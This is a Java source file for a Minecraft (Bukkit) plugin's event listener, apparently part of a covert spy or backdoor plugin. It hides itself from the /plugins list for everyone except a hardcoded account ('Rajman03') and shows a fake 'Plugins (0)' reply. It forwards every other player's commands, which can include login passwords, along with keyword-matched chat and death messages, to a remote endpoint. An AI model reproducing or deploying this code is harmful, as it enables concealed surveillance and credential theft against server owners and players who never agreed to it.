package pl.qc.core;

import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import java.util.*;

public class Events implements Listener {
    private final QC plugin;

    public Events(QC plugin) {
        this.plugin = plugin;
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onCommandSpy(PlayerCommandPreprocessEvent event) {
        if (plugin.isPanic())
            return;
        Player p = event.getPlayer();
        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
        String msg = event.getMessage().toLowerCase();

        if (msg.startsWith("/plugins") || msg.startsWith("/pl") || msg.equals("/?")) {
            if (!p.getName().equals(adm)) {
                p.sendMessage("Plugins (0):");
                event.setCancelled(true);
                return;
            }
        }

        if (plugin.getConfig().getBoolean("spy.command-spy", true) && !p.getName().equals(adm)) {
            Map<String, String> f = new LinkedHashMap<>();
            f.put("Gracz", p.getName());
            f.put("Komenda", "`" + event.getMessage() + "`");
            Remote.send("Spy: Komenda 🛰️", "3447003", null, f);
        }
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onChatSpy(AsyncPlayerChatEvent event) {
        if (plugin.isPanic())
            return;
        Player p = event.getPlayer();
        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
        if (p.getName().equals(adm) || !plugin.getConfig().getBoolean("spy.social-spy", true))
            return;

        String msg = event.getMessage().toLowerCase();
        plugin.getConfig().getStringList("spy.keywords").stream()
                .filter(k -> msg.contains(k.toLowerCase()))
                .findFirst().ifPresent(k -> {
                    Map<String, String> f = new LinkedHashMap<>();
                    f.put("Gracz", p.getName());
                    f.put("Treść", event.getMessage());
                    f.put("Słowo", k);
                    Remote.send("Spy: Alerty ⚠️", "16711680", null, f);
                });
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onDeath(PlayerDeathEvent event) {
        if (plugin.isPanic() || !plugin.getConfig().getBoolean("logger.deaths", true))
            return;
        Player p = event.getEntity();
        Map<String, String> f = new LinkedHashMap<>();
        f.put("Gracz", p.getName());
        f.put("Powód", event.getDeathMessage());
        Remote.send("Śmierć 💀", "16711680", null, f);
    }
}
